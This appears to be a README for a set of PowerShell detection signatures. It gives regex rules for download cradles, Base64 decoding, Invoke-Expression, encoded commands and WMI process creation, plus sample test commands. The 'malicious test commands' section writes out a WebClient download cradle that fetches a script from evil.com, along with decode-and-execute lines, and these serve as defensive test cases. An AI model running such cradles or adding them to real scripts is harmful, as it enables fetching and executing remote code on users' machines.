# PowerShell Signature Examples

This directory contains example signatures demonstrating best practices and common patterns.

## Example Signatures

### 1. Download Cradle Detection
```json
{
  "name": "POWERSHELL_DOWNLOAD_CRADLE_WEBCLIENT",
  "regex": "New-Object\\s+System\\.Net\\.WebClient.*\\.DownloadString\\s*\\(",
  "flags": "i",
  "score": 80,
  "severity": "high",
  "description": "Detects PowerShell download cradle using WebClient.DownloadString method",
  "category": "EXECUTION"
}
```

### 2. Base64 Encoding Detection
```json
{
  "name": "POWERSHELL_BASE64_DECODE_PATTERN",
  "regex": "\\[System\\.Text\\.Encoding\\]::\\w+\\.GetString\\(\\[System\\.Convert\\]::FromBase64String",
  "flags": "i",
  "score": 75,
  "severity": "high",
  "description": "Detects Base64 decoding pattern commonly used in malicious PowerShell",
  "category": "OBFUSCATION"
}
```

### 3. Invoke-Expression with Variables
```json
{
  "name": "POWERSHELL_INVOKE_EXPRESSION_VARIABLE",
  "regex": "Invoke-Expression\\s*\\(\\s*\\$\\w+",
  "flags": "i",
  "score": 70,
  "severity": "high",
  "description": "Detects Invoke-Expression with variable input, common in malicious scripts",
  "category": "EXECUTION"
}
```

### 4. Encoded Command Parameter
```json
{
  "name": "POWERSHELL_ENCODED_COMMAND_PARAM",
  "regex": "-EncodedCommand\\s+[A-Za-z0-9+/]{50,}",
  "flags": "i",
  "score": 85,
  "severity": "high",
  "description": "Detects PowerShell execution with encoded command parameter",
  "category": "OBFUSCATION"
}
```

### 5. WMI Process Creation
```json
{
  "name": "POWERSHELL_WMI_PROCESS_CREATE",
  "regex": "Invoke-WmiMethod\\s+.*Win32_Process.*Create",
  "flags": "i",
  "score": 75,
  "severity": "medium",
  "description": "Detects process creation via WMI, often used for lateral movement",
  "category": "LATERAL_MOVEMENT"
}
```

## Testing Commands

### Safe Test Commands (should NOT trigger)
```powershell
# These commands should not trigger the signatures above
Get-Process
Get-Service
Write-Output "Hello World"
```

### Malicious Test Commands (should trigger)
```powershell
# These would trigger the download cradle signature
(New-Object System.Net.WebClient).DownloadString('http://evil.com/script.ps1')

# This would trigger the base64 signature
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encoded))

# This would trigger the Invoke-Expression signature
Invoke-Expression ($malicious_var)
```

## Pattern Development Tips

1. **Start Simple**: Begin with basic patterns and refine
2. **Test Thoroughly**: Use both malicious and legitimate samples
3. **Escape Properly**: Remember to escape regex special characters
4. **Consider Context**: Include enough context to avoid false positives
5. **Performance Matters**: Avoid complex patterns that cause slowdowns
